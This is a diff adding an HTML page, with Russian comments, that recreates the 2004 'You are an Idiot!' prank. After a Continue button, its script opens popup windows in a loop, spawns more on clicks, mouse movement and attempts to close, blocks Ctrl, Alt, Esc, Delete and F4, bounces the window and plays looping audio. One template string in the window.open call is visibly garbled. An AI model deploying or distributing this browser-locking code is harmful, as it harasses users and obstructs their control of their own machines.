@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>You are an Idiot!</title>
+<meta charset="utf-8">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+    background: #111;
+    color: #fff;
+  }
+
+  /* ===== Экран с кнопкой ===== */
+  #start-screen {
+    width: 100%;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    background: #000;
+  }
+
+  #start-screen h1 {
+    font-size: 42px;
+    margin-bottom: 20px;
+    color: #fff;
+  }
+
+  #start-screen p {
+    font-size: 18px;
+    color: #aaa;
+    margin-bottom: 40px;
+    max-width: 500px;
+    line-height: 1.5;
+  }
+
+  #continue-btn {
+    padding: 18px 55px;
+    font-size: 22px;
+    font-weight: bold;
+    background: #fff;
+    color: #000;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: 0.15s;
+  }
+
+  #continue-btn:hover {
+    background: #ff0;
+    transform: scale(1.05);
+  }
+
+  /* ===== Сам вирус ===== */
+  #virus {
+    display: none;
+    width: 100%;
+    height: 100%;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    animation: flash 0.35s infinite step-end;
+  }
+
+  @keyframes flash {
+    0%   { background: #000; color: #fff; }
+    50%  { background: #fff; color: #000; }
+  }
+
+  #virus h1 {
+    font-family: "Times New Roman", serif;
+    font-size: 6.5vw;
+    font-weight: normal;
+    margin-bottom: 45px;
+  }
+
+  .faces {
+    display: flex;
+    gap: 50px;
+    font-size: 8vw;
+  }
+
+  .face {
+    width: 1.15em;
+    height: 1.15em;
+    border: 0.08em solid currentColor;
+    border-radius: 50%;
+    position: relative;
+  }
+
+  .face::before, .face::after {
+    content: "";
+    position: absolute;
+    width: 0.22em;
+    height: 0.22em;
+    background: currentColor;
+    border-radius: 50%;
+    top: 0.28em;
+  }
+
+  .face::before { left: 0.25em; }
+  .face::after  { right: 0.25em; }
+
+  .face span {
+    position: absolute;
+    bottom: 0.22em;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 0.5em;
+    height: 0.25em;
+    border-bottom: 0.08em solid currentColor;
+    border-radius: 0 0 50% 50%;
+  }
+</style>
+</head>
+<body>
+
+<!-- Стартовый экран -->
+<div id="start-screen">
+  <h1>You are an Idiot!</h1>
+  <p>
+    Это воссоздание легендарного прикола 2004 года.<br>
+    После нажатия кнопки начнётся спам окон + звук.
+  </p>
+  <button id="continue-btn">Continue</button>
+</div>
+
+<!-- Сам вирус (скрыт) -->
+<div id="virus">
+  <h1>you are an idiot</h1>
+  <div class="faces">
+    <div class="face"><span></span></div>
+    <div class="face"><span></span></div>
+    <div class="face"><span></span></div>
+  </div>
+</div>
+
+<audio id="audio" loop>
+  <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  const startScreen = document.getElementById("start-screen");
+  const virus = document.getElementById("virus");
+  const audio = document.getElementById("audio");
+  const btn = document.getElementById("continue-btn");
+
+  // === Bounce ===
+  let xOff = 7, yOff = 5, xPos = 200, yPos = 150;
+
+  function bounce() {
+    xPos += xOff;
+    yPos += yOff;
+
+    if (xPos > screen.availWidth - 320)  xOff = -(Math.abs(xOff) + Math.random() * 4);
+    if (xPos < 0)                       xOff =  Math.abs(xOff) + Math.random() * 4;
+    if (yPos > screen.availHeight - 240) yOff = -(Math.abs(yOff) + Math.random() * 4);
+    if (yPos < 0)                       yOff =  Math.abs(yOff) + Math.random() * 4;
+
+    try { window.moveTo(Math.floor(xPos), Math.floor(yPos)); } catch(e) {}
+    requestAnimationFrame(bounce);
+  }
+
+  // === Спавн окон ===
+  function spawn(count = 5) {
+    for (let i = 0; i < count; i++) {
+      const left = Math.floor(Math.random() * (screen.availWidth - 300));
+      const top  = Math.floor(Math.random() * (screen.availHeight - 220));
+
+      const w = window.open(
+        location.href,
+        "_blank",
+        `width=300,height=220,left=\( {left},top= \){top},menubar=no,toolbar=no,location=no,status=no,resizable=no`
+      );
+      if (w) {
+        try { w.focus(); } catch(e) {}
+      }
+    }
+  }
+
+  // === Запуск вируса ===
+  function startVirus() {
+    startScreen.style.display = "none";
+    virus.style.display = "flex";
+
+    audio.volume = 1;
+    audio.play().catch(() => {});
+
+    bounce();
+    spawn(6); // сразу пачка окон
+
+    // дальше спамим
+    setInterval(() => spawn(3), 1800);
+
+    // при попытке закрыть
+    window.onbeforeunload = () => {
+      spawn(8);
+      return "You are an idiot!";
+    };
+
+    // клик и движение мыши тоже спавнят
+    document.body.onclick = () => spawn(4);
+    document.body.onmousemove = () => {
+      if (Math.random() > 0.92) spawn(2);
+    };
+
+    // блокировка клавиш
+    document.onkeydown = (e) => {
+      if ([17, 18, 27, 46, 115].includes(e.keyCode)) {
+        e.preventDefault();
+        alert("You are an idiot!");
+        spawn(5);
+      }
+    };
+  }
+
+  // Кнопка Continue
+  btn.addEventListener("click", startVirus);
+</script>
+</body>
+  </html>
